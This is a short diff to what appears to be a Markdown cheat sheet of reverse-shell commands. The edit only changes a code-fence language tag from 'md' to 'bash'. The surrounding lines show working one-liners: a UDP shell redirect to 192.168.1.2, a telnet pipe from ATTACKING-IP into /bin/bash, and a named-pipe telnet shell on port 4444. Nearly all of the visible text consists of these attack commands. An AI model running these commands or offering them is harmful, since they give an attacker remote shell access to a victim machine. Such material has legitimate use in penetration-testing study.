@@ -20,7 +20,7 @@ sh -i >& /dev/udp/192.168.1.2/5555 0>&1
  
 ```
 ## Telnet Reverse Shell
-```md
+```bash
 telnet ATTACKING-IP 80 | /bin/bash | telnet 192.168.1.2 4444
 rm -f /tmp/p; mknod /tmp/p p && telnet 192.168.1.2 4444 0/tmp/p
  ```
